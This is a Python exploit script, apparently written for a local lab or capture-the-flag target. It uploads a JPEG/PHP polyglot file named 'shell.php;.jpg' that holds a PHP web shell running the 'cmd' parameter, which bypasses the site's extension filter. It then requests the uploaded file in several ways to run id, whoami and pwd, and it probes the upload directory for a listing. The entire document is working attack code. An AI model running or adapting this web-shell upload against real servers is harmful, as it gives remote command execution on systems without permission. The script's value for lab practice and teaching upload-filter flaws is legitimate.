import requests
import re

base_url = "http://127.0.0.1:32824"
print("Testing PHP execution via semicolon extension bypass")
print("=" * 60)

# Upload the .php;.jpg file again
polyglot_content = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x48\x48\x00\x01\x00\x01\x00\x00"
    b"<?php system($_GET['cmd']); ?>"
    b"\xff\xd9"
)

files = {'userfile': ('shell.php;.jpg', polyglot_content, 'image/jpeg')}
data = {'submit': 'Upload Image'}

upload_response = requests.post(f"{base_url}/index.php", files=files, data=data)
print("Uploaded file: shell.php;.jpg")

if "successfully uploaded" in upload_response.text:
    match = re.search(r"href='([^']+)'", upload_response.text)
    if match:
        upload_path = match.group(1)  # upload/shell.php;.jpg
        print(f"Actual uploaded path: {upload_path}")
        
        # Try different access methods
        print("\n[*] Testing different access methods:")
        
        # Method 1: Direct access to upload/shell.php;.jpg
        test_url1 = f"{base_url}/{upload_path}?cmd=id"
        resp1 = requests.get(test_url1, timeout=10)
        print(f"\n[Method 1] URL: {test_url1}")
        print(f"Status: {resp1.status_code}")
        print(f"Content Length: {len(resp1.text)}")
        print(f"Content-Type: {resp1.headers.get('content-type', 'unknown')}")
        # Check if it's executable
        if "application/octet-stream" not in resp1.headers.get('content-type', '') and "image/jpeg" not in resp1.headers.get('content-type', ''):
            print(f"🔍 Response: {resp1.text[:2000]}")
        
        # Method 2: Try accessing as .php (without .jpg)
        php_path = upload_path.replace(";.jpg", "")
        test_url2 = f"{base_url}/{php_path}?cmd=whoami"
        resp2 = requests.get(test_url2, timeout=10)
        print(f"\n[Method 2] URL: {test_url2}")
        print(f"Status: {resp2.status_code}")
        print(f"Content Length: {len(resp2.text)}")
        if resp2.status_code == 200 and "whoami" not in str(resp2.headers):
            print(f"🔍 Response: {resp2.text[:2000]}")
        
        # Method 3: Try accessing with .php; (semicolon ending)
        semicolon_path = upload_path.replace(".jpg", "")
        test_url3 = f"{base_url}/{semicolon_path}?cmd=pwd"
        resp3 = requests.get(test_url3, timeout=10)
        print(f"\n[Method 3] URL: {test_url3}")
        print(f"Status: {resp3.status_code}")
        print(f"Content Length: {len(resp3.text)}")
        if resp3.status_code == 200:
            print(f"🔍 Response: {resp3.text[:2000]}")
        
        # Method 4: Try accessing directory listing
        upload_dir = "/upload/"
        dir_url = f"{base_url}{upload_dir}"
        dir_resp = requests.get(dir_url, timeout=10)
        print(f"\n[Method 4] Directory: {dir_url}")
        print(f"Directory Status: {dir_resp.status_code}")
        if dir_resp.status_code == 200:
            print(f"Directory listing:\n{dir_resp.text[:2000]}")

print("\n" + "=" * 60)
